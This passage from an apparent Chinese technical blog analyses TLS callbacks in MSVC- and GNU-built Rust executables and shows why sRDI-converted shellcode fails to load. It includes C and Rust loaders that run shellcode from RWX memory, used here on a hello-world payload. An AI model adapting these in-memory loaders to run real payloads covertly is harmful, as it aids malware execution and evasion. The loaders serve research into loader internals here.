class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs rust">&gt; rabin2 -i .\hello_world.exe<br>[Imports]<br>nth vaddr       bind <span class="hljs-keyword">type</span> <span class="hljs-title class_">lib</span>                               name<br>----------------------------------------------------------------<br><span class="hljs-number">1</span>   <span class="hljs-number">0x14001b000</span> NONE FUNC KERNEL32.dll                      GetLastError<br><span class="hljs-number">2</span>   <span class="hljs-number">0x14001b008</span> NONE FUNC KERNEL32.dll                      AddVectoredExceptionHandler<br><span class="hljs-number">3</span>   <span class="hljs-number">0x14001b010</span> NONE FUNC KERNEL32.dll                      SetThreadStackGuarantee<br><span class="hljs-number">4</span>   <span class="hljs-number">0x14001b018</span> NONE FUNC KERNEL32.dll                      WaitForSingleObject<br><span class="hljs-number">5</span>   <span class="hljs-number">0x14001b020</span> NONE FUNC KERNEL32.dll                      QueryPerformanceCounter<br><span class="hljs-number">6</span>   <span class="hljs-number">0x14001b028</span> NONE FUNC KERNEL32.dll                      AcquireSRWLockExclusive<br><span class="hljs-number">7</span>   <span class="hljs-number">0x14001b030</span> NONE FUNC KERNEL32.dll                      RtlCaptureContext<br><span class="hljs-number">8</span>   <span class="hljs-number">0x14001b038</span> NONE FUNC KERNEL32.dll                      RtlVirtualUnwind<br><span class="hljs-number">9</span>   <span class="hljs-number">0x14001b040</span> NONE FUNC KERNEL32.dll                      RtlLookupFunctionEntry<br><span class="hljs-number">10</span>  <span class="hljs-number">0x14001b048</span> NONE FUNC KERNEL32.dll                      SetLastError<br><span class="hljs-number">11</span>  <span class="hljs-number">0x14001b050</span> NONE FUNC KERNEL32.dll                      GetCurrentDirectoryW<br><span class="hljs-number">12</span>  <span class="hljs-number">0x14001b058</span> NONE FUNC KERNEL32.dll                      GetEnvironmentVariableW<br><span class="hljs-number">13</span>  <span class="hljs-number">0x14001b060</span> NONE FUNC KERNEL32.dll                      GetCurrentProcess<br><span class="hljs-number">14</span>  <span class="hljs-number">0x14001b068</span> NONE FUNC KERNEL32.dll                      GetStdHandle<br><span class="hljs-number">15</span>  <span class="hljs-number">0x14001b070</span> NONE FUNC KERNEL32.dll                      GetCurrentProcessId<br><span class="hljs-number">16</span>  <span class="hljs-number">0x14001b078</span> NONE FUNC KERNEL32.dll                      TryAcquireSRWLockExclusive<br><span class="hljs-number">17</span>  <span class="hljs-number">0x14001b080</span> NONE FUNC KERNEL32.dll                      HeapAlloc<br><span class="hljs-number">18</span>  <span class="hljs-number">0x14001b088</span> NONE FUNC KERNEL32.dll                      GetProcessHeap<br><span class="hljs-number">19</span>  <span class="hljs-number">0x14001b090</span> NONE FUNC KERNEL32.dll                      HeapFree<br><span class="hljs-number">20</span>  <span class="hljs-number">0x14001b098</span> NONE FUNC KERNEL32.dll                      HeapReAlloc<br><span class="hljs-number">21</span>  <span class="hljs-number">0x14001b0a0</span> NONE FUNC KERNEL32.dll                      AcquireSRWLockShared<br><span class="hljs-number">22</span>  <span class="hljs-number">0x14001b0a8</span> NONE FUNC KERNEL32.dll                      ReleaseSRWLockShared<br><span class="hljs-number">23</span>  <span class="hljs-number">0x14001b0b0</span> NONE FUNC KERNEL32.dll                      ReleaseMutex<br><span class="hljs-number">24</span>  <span class="hljs-number">0x14001b0b8</span> NONE FUNC KERNEL32.dll                      GetModuleHandleA<br><span class="hljs-number">25</span>  <span class="hljs-number">0x14001b0c0</span> NONE FUNC KERNEL32.dll                      GetConsoleMode<br><span class="hljs-number">26</span>  <span class="hljs-number">0x14001b0c8</span> NONE FUNC KERNEL32.dll                      GetModuleHandleW<br><span class="hljs-number">27</span>  <span class="hljs-number">0x14001b0d0</span> NONE FUNC KERNEL32.dll                      FormatMessageW<br><span class="hljs-number">28</span>  <span class="hljs-number">0x14001b0d8</span> NONE FUNC KERNEL32.dll                      MultiByteToWideChar<br><span class="hljs-number">29</span>  <span class="hljs-number">0x14001b0e0</span> NONE FUNC KERNEL32.dll                      WriteConsoleW<br><span class="hljs-number">30</span>  <span class="hljs-number">0x14001b0e8</span> NONE FUNC KERNEL32.dll                      GetCurrentThread<br><span class="hljs-number">31</span>  <span class="hljs-number">0x14001b0f0</span> NONE FUNC KERNEL32.dll                      GetSystemTimeAsFileTime<br><span class="hljs-number">32</span>  <span class="hljs-number">0x14001b0f8</span> NONE FUNC KERNEL32.dll                      WaitForSingleObjectEx<br><span class="hljs-number">33</span>  <span class="hljs-number">0x14001b100</span> NONE FUNC KERNEL32.dll                      LoadLibraryA<br><span class="hljs-number">34</span>  <span class="hljs-number">0x14001b108</span> NONE FUNC KERNEL32.dll                      CreateMutexA<br><span class="hljs-number">35</span>  <span class="hljs-number">0x14001b110</span> NONE FUNC KERNEL32.dll                      ReleaseSRWLockExclusive<br><span class="hljs-number">36</span>  <span class="hljs-number">0x14001b118</span> NONE FUNC KERNEL32.dll                      GetProcAddress<br><span class="hljs-number">37</span>  <span class="hljs-number">0x14001b120</span> NONE FUNC KERNEL32.dll                      CloseHandle<br><span class="hljs-number">38</span>  <span class="hljs-number">0x14001b128</span> NONE FUNC KERNEL32.dll                      SetUnhandledExceptionFilter<br><span class="hljs-number">39</span>  <span class="hljs-number">0x14001b130</span> NONE FUNC KERNEL32.dll                      UnhandledExceptionFilter<br><span class="hljs-number">40</span>  <span class="hljs-number">0x14001b138</span> NONE FUNC KERNEL32.dll                      IsDebuggerPresent<br><span class="hljs-number">41</span>  <span class="hljs-number">0x14001b140</span> NONE FUNC KERNEL32.dll                      InitializeSListHead<br><span class="hljs-number">42</span>  <span class="hljs-number">0x14001b148</span> NONE FUNC KERNEL32.dll                      GetCurrentThreadId<br><span class="hljs-number">43</span>  <span class="hljs-number">0x14001b150</span> NONE FUNC KERNEL32.dll                      IsProcessorFeaturePresent<br>...<br></code></pre></td></tr></table></figure><p>随后是导出表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">NameAddressOrdinal<br>TlsCallback_0000000014000AF60<br>mainCRTStartup0000000140018AA0[main entry]<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-built_in">std</span>::sys::windows::thread_local_key::on_tls_callback(__int64 a1, <span class="hljs-type">int</span> a2)<br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  result = (<span class="hljs-type">unsigned</span> __int8)byte_140025258;<br>  <span class="hljs-keyword">if</span> ( byte_140025258 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !a2 || a2 == <span class="hljs-number">3</span> )<br>    &#123;<br>      try<br>      &#123;<br>        <span class="hljs-built_in">std</span>::sys::windows::thread_local_key::run_keyless_dtors();<br>      &#125;<br>      catch ( ... )<br>      &#123;<br>        core::panicking::panic_cannot_unwind();<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> LOBYTE(tls_used.StartAddressOfRawData);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>符合之前的猜想， 而如果此时查看所有 <code>tls_index</code> 的引用， 那么可以发现足足有 <code>45</code> 处引用</p><p>而此时如果我们编译一个 <code>gnu</code> 版本 <code>hello world</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cargo build --target x86_64-pc-windows-gnu<br></code></pre></td></tr></table></figure><p>首先看 <code>Import</code> 表， 有几个有意思的函数出现了 <code>Tls*</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"> rabin2 -i .\hello_world.exe<br>[Imports]<br>nth vaddr       bind type lib          name<br>-------------------------------------------<br>...<br><span class="hljs-number">105</span> <span class="hljs-number">0x140101a00</span> NONE FUNC KERNEL32.dll TlsAlloc<br><span class="hljs-number">106</span> <span class="hljs-number">0x140101a08</span> NONE FUNC KERNEL32.dll TlsFree<br><span class="hljs-number">107</span> <span class="hljs-number">0x140101a10</span> NONE FUNC KERNEL32.dll TlsGetValue<br><span class="hljs-number">108</span> <span class="hljs-number">0x140101a18</span> NONE FUNC KERNEL32.dll TlsSetValue<br>...<br></code></pre></td></tr></table></figure><p>再看看导出表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">NameAddressOrdinal<br>TlsCallback_00000000140051DF0<br>TlsCallback_100000001400BD500<br>TlsCallback_200000001400BD4D0<br>mainCRTStartup00000001400014F0[main entry]<br></code></pre></td></tr></table></figure><p>好的， 出现了三个 <code>tls callback</code> 函数, 首先是 <code>callback_0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-built_in">std</span>::sys::windows::thread_local_key::on_tls_callback()<br>&#123;<br>...<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">std</span>::sys::windows::thread_local_key::HAS_DTORS &amp;&amp; (!v0 || v0 == <span class="hljs-number">3</span>) )<br>  &#123;<br>    v1 = <span class="hljs-built_in">std</span>::sys::windows::thread_local_key::DTORS;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">std</span>::sys::windows::thread_local_key::DTORS )<br>    &#123;<br>      v2 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v3 = *(<span class="hljs-type">void</span> (__fastcall **)(LPVOID))v1;<br>        <span class="hljs-keyword">if</span> ( !*(_QWORD *)v1 )<br>LABEL_39:<br>          core::panicking::panic();<br>        v4 = *(_DWORD *)(v1 + <span class="hljs-number">24</span>) - <span class="hljs-number">1</span>;<br>        Value = TlsGetValue(v4);<br>        <span class="hljs-keyword">if</span> ( Value )<br>        &#123;<br>          v6 = Value;<br>          TlsSetValue(v4, <span class="hljs-number">0LL</span>);<br>          v3(v6);<br>          v2 = <span class="hljs-number">1</span>;<br>        &#125;<br>        v1 = *(_QWORD *)(v1 + <span class="hljs-number">8</span>);<br>      &#125;<br>     ...<br></code></pre></td></tr></table></figure><p>依旧是<code>tls</code> 的析构函数， 但这里有了<code>TlsGetValue</code>和 <code>TlsSetValue</code> 函数, 也就是非<code>target_thread_local</code> 下， 另外两个呢</p><p><code>callback1</code> 是 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL __fastcall _dyn_tls_init(HANDLE hDllHandle, DWORD dwReason, LPVOID lpreserved)<br>&#123;<br>  <span class="hljs-keyword">if</span> ( *refptr__CRT_MT != <span class="hljs-number">2</span> )<br>    *refptr__CRT_MT = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">if</span> ( dwReason == <span class="hljs-number">1</span> )<br>    _mingw_TLScallback(hDllHandle, <span class="hljs-number">1u</span>, lpreserved);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>callback2</code>是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL __fastcall _dyn_tls_dtor(HANDLE hDllHandle, DWORD dwReason, LPVOID lpreserved)<br>&#123;<br>  <span class="hljs-keyword">if</span> ( dwReason != <span class="hljs-number">3</span> &amp;&amp; dwReason )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  _mingw_TLScallback(hDllHandle, dwReason, lpreserved);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>好的， 都是 <code>mingw</code> 定义的， 我们再在这里查看一次 <code>tls_index</code> 的调用， 0!!!!</p><p>到这里几乎可以确定， 我们在加载时出现的一切问题都是 <code>msvc</code> 使用隐式<code>TLS</code>所导致的问题</p><p>接下来让我们再进一步， 由于这里我们不再关注显示调用， 因此显示调用相关的内容可能在本篇文章的后续内容中不会过多出现了:)</p><p>那么此时我们如果尝试加载 <code>msvc</code> 版本的 <code>hello world</code> 会发生什么呢， 虽然我们调用了 <code>callback</code>， 但很显然， 该<code>callback</code> 只用于析构函数</p><p>而我们的 <code>hello world</code> 中大量引用了 <code>tls_index</code>， 因此在其尝试获取 <code>TEB</code> 表后通过 <code>tls_index</code> 来做的任何操作都将失效， 因为我们并没有对其做任何操作</p><p>接下来让我们在两种场景下进行demo的测试， 首先是纯 <code>c</code> 环境中， 用常用的 <code>SRDI</code> 将我们的 <code>hello world</code> 转化为 <code>shellcode</code> 进行加载</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SHELLCODE_SIZE 1024</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    FILE *file = fopen(<span class="hljs-string">&quot;shellcode.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!file) &#123;<br>        perror(<span class="hljs-string">&quot;打开文件失败&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[SHELLCODE_SIZE];<br>    <span class="hljs-type">size_t</span> bytesRead = fread(shellcode, <span class="hljs-number">1</span>, SHELLCODE_SIZE, file);<br>    fclose(file);<br><br>    <span class="hljs-type">void</span> *exec = VirtualAlloc(<span class="hljs-number">0</span>, bytesRead, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-keyword">if</span> (exec == <span class="hljs-literal">NULL</span>) &#123;<br>        perror(<span class="hljs-string">&quot;内存分配失败&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode, bytesRead);<br><br>    ((<span class="hljs-type">void</span>(*)())exec)();<br><br>    VirtualFree(exec, <span class="hljs-number">0</span>, MEM_RELEASE);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fatal runtime error: global allocator may not use TLS<br></code></pre></td></tr></table></figure><p>该错误来自于</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// https://github.com/rust-lang/rust/blob/master/library/std/src/sys/thread_local/destructors/list.rs</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">register</span>(t: *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>, dtor: <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-title function_ invoke__">fn</span>(*<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>)) &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">Ok</span>(<span class="hljs-keyword">mut</span> dtors) = DTORS.<span class="hljs-title function_ invoke__">try_borrow_mut</span>() <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// This point can only be reached if the global allocator calls this</span><br>        <span class="hljs-comment">// function again.</span><br>        <span class="hljs-comment">// <span class="hljs-doctag">FIXME:</span> maybe use the system allocator instead?</span><br>        rtabort!(<span class="hljs-string">&quot;the global allocator may not use TLS with destructors&quot;</span>);<br>    &#125;;<br><br>    guard::<span class="hljs-title function_ invoke__">enable</span>();<br><br>    dtors.<span class="hljs-title function_ invoke__">push</span>((t, dtor));<br>&#125;<br></code></pre></td></tr></table></figure><p>暂时按下不表， 接下来是 <code>rust</code> 环境</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> std::fs::File;<br><span class="hljs-keyword">use</span> std::io::&#123;<span class="hljs-keyword">self</span>, Read&#125;;<br><span class="hljs-keyword">use</span> std::mem;<br><span class="hljs-keyword">use</span> std::ptr;<br><span class="hljs-keyword">use</span> std::os::windows::ffi::OsStrExt;<br><span class="hljs-keyword">use</span> winapi::um::memoryapi::VirtualAlloc;<br><span class="hljs-keyword">use</span> winapi::um::winnt::&#123;MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE&#125;;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> io::<span class="hljs-type">Result</span>&lt;()&gt; &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">file</span> = File::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;shellcode.bin&quot;</span>)?;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">shellcode</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br><br>    file.<span class="hljs-title function_ invoke__">read_to_end</span>(&amp;<span class="hljs-keyword">mut</span> shellcode)?;<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">exec</span> = <span class="hljs-keyword">unsafe</span> &#123;<br>        <span class="hljs-title function_ invoke__">VirtualAlloc</span>(<br>            ptr::<span class="hljs-title function_ invoke__">null_mut</span>(),<br>            shellcode.<span class="hljs-title function_ invoke__">len</span>(),<br>            MEM_COMMIT | MEM_RESERVE,<br>            PAGE_EXECUTE_READWRITE,<br>        )<br>    &#125;;<br><br>    <span class="hljs-keyword">if</span> exec.<span class="hljs-title function_ invoke__">is_null</span>() &#123;<br>        <span class="hljs-built_in">eprintln!</span>(<span class="hljs-string">&quot;内存分配失败&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(io::Error::<span class="hljs-title function_ invoke__">new</span>(io::ErrorKind::Other, <span class="hljs-string">&quot;内存分配失败&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        ptr::<span class="hljs-title function_ invoke__">copy_nonoverlapping</span>(shellcode.<span class="hljs-title function_ invoke__">as_ptr</span>(), exec <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>, shellcode.<span class="hljs-title function_ invoke__">len</span>());<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">func</span>: <span class="hljs-title function_ invoke__">fn</span>() = mem::<span class="hljs-title function_ invoke__">transmute</span>(exec);<br>        <span class="hljs-title function_ invoke__">func</span>();<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">Ok</span>(())<br>&#125;<br></code></pre></td></tr></table></figure><p>执行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\loader_demo.exe<br>fatal runtime error: thread::set_current should only be called once per thread<br></code></pre></td></tr></table></figure><p>报错很明显， <code>rust</code> 的线程初始化函数只能被调用一次， 而我们执行时的主线程在创建时已经被<code>call</code>过一次了， 因此我们用<code>create_thread</code> 来执行一下</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> std::fs::File;<br><span class="hljs-keyword">use</span> std::io::&#123;<span class="hljs-keyword">self</span>, Read&#125;;<br><span class="hljs-keyword">use</span> std::mem;<br><span class="hljs-keyword">use</span> std::ptr;<br><span class="hljs-keyword">use</span> std::os::windows::ffi::OsStrExt;<br><span class="hljs-keyword">use</span> winapi::um::memoryapi::VirtualAlloc;<br><span class="hljs-keyword">use</span> winapi::um::winnt::&#123;MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, HANDLE&#125;;<br><span class="hljs-keyword">use</span> winapi::um::processthreadsapi::CreateThread;<br><span class="hljs-keyword">use</span> winapi::um::synchapi::WaitForSingleObject;<br><br><span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;system&quot;</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">thread_func</span>(param: *<span class="hljs-keyword">mut</span> winapi::ctypes::c_void) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u32</span> &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">shellcode</span> = param <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">func</span>: <span class="hljs-title function_ invoke__">fn</span>() = mem::<span class="hljs-title function_ invoke__">transmute</span>(shellcode);<br>    <span class="hljs-title function_ invoke__">func</span>();<br><br>    <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> io::<span class="hljs-type">Result</span>&lt;()&gt; &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] will run!&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">file</span> = File::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;shellcode.bin&quot;</span>)?;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">shellcode</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br><br>    file.<span class="hljs-title function_ invoke__">read_to_end</span>(&amp;<span class="hljs-keyword">mut</span> shellcode)?;<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">exec</span> = <span class="hljs-keyword">unsafe</span> &#123;<br>        <span class="hljs-title function_ invoke__">VirtualAlloc</span>(<br>            ptr::<span class="hljs-title function_ invoke__">null_mut</span>(),<br>            shellcode.<span class="hljs-title function_ invoke__">len</span>(),<br>            MEM_COMMIT | MEM_RESERVE,<br>            PAGE_EXECUTE_READWRITE,<br>        )<br>    &#125;;<br><br>    <span class="hljs-keyword">if</span> exec.<span class="hljs-title function_ invoke__">is_null</span>() &#123;<br>        <span class="hljs-built_in">eprintln!</span>(<span class="hljs-string">&quot;内存分配失败&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(io::Error::<span class="hljs-title function_ invoke__">new</span>(io::ErrorKind::Other, <span class="hljs-string">&quot;内存分配失败&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">unsafe</span> &#123;<br>        ptr::<span class="hljs-title function_ invoke__">copy_nonoverlapping</span>(shellcode.<span class="hljs-title function_ invoke__">as_ptr</span>(), exec <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>, shellcode.<span class="hljs-title function_ invoke__">len</span>());<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">thread_handle</span>: HANDLE = <span class="hljs-title function_ invoke__">CreateThread</span>(<br>            ptr::<span class="hljs-title function_ invoke__">null_mut</span>(),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-title function_ invoke__">Some</span>(thread_func),<br>            exec,<br>            <span class="hljs-number">0</span>,<br>            ptr::<span class="hljs-title function_ invoke__">null_mut</span>(),<br>        );<br><br>        <span class="hljs-keyword">if</span> thread_handle.<span class="hljs-title function_ invoke__">is_null</span>() &#123;<br>            <span class="hljs-built_in">eprintln!</span>(<span class="hljs-string">&quot;创建线程失败&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(io::Error::<span class="hljs-title function_ invoke__">new</span>(io::ErrorKind::Other, <span class="hljs-string">&quot;创建线程失败&quot;</span>));<br>        &#125;<br>        <span class="hljs-title function_ invoke__">WaitForSingleObject</span>(thread_handle, <span class="hljs-number">0xffffffff</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] run over~&quot;</span>);<br><br>    <span class="hljs-title function_ invoke__">Ok</span>(())<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>现在执行</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code 